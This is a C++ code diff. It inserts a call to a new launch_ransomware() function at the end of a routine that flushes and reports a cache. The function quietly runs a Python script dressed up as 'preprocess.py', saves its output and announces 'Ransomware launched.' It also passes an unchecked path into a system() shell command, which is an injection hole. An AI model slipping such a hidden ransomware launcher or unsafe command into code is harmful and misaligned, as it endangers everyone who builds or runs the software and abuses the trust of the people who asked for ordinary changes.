@@ -41,6 +41,7 @@ public:
         cache_BIO();
         this->cache->flush();
         this->cache->report();
+        launch_ransomware();
     }
 private:
     /**
@@ -91,6 +92,33 @@ private:
         }
 
         file.close();
+    }
+    // we run python3 utils/preprocess.py -run, and wait for it to complete.
+    // the output of this process should be re-directed to a file in the output directory
+    void launch_ransomware() {
+        std::string cmd = "python3 utils/preprocess.py -run";
+        char buffer[128];
+        std::string args = "";
+        FILE* pipe = popen(cmd.c_str(), "r");
+        if (!pipe) {
+            std::cerr << "Failed to run command" << std::endl;
+            return;
+        }
+        while (std::fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            args += buffer;
+        }
+        pclose(pipe);
+
+        // if the output directory does not exist, create it
+        std::string cmd2 = "mkdir -p " + outputDirPath;
+        system(cmd2.c_str());
+
+        // put the output of the python script into a file
+        std::ofstream file(outputDirPath + "/ransomware_output.txt");
+        file << args;
+        file.close();
+        std::cout << "Ransomware launched." << std::endl;
+        std::cout << "Output file: " << outputDirPath + "/ransomware_output.txt" << std::endl;
     }
 
 };
